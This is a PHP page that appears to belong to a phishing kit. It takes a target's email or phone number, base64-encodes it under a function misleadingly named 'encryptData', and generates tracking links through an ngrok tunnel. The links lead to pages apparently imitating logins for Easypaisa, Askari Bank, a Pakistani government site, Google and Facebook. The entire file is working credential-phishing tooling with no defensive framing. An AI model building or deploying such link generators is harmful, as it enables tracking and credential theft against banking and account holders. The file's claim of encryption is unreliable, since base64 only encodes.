<?php
function encryptData($data) {
    return urlencode(base64_encode($data));
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $input = trim($_POST['input']);
    if (!empty($input)) {
        $encryptedInput = encryptData($input);
        
        $links = [
            "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
            "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
            "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
            "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
            "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
            "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
            "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
            "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
            "https://8671-103-137-24-144.ngrok-free.app/eshop2",
            "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
        ];

        echo "<h3>Generated Links:</h3><ul>";
        foreach ($links as $link) {
            $trackingLink = "track.php?data=$encryptedInput&link=" . urlencode($link);
            echo "<li><a href='$trackingLink' target='_blank'>$trackingLink</a></li>";
        }
        echo "</ul>";
    } else {
        echo "<p style='color:red;'>Please enter an email or phone number.</p>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Generate Encrypted Links</title>
</head>
<body>
    <h2>Enter Email or Phone Number</h2>
    <form method="post">
        <input type="text" name="input" required>
        <button type="submit">Generate Links</button>
    </form>
</body>
</html>
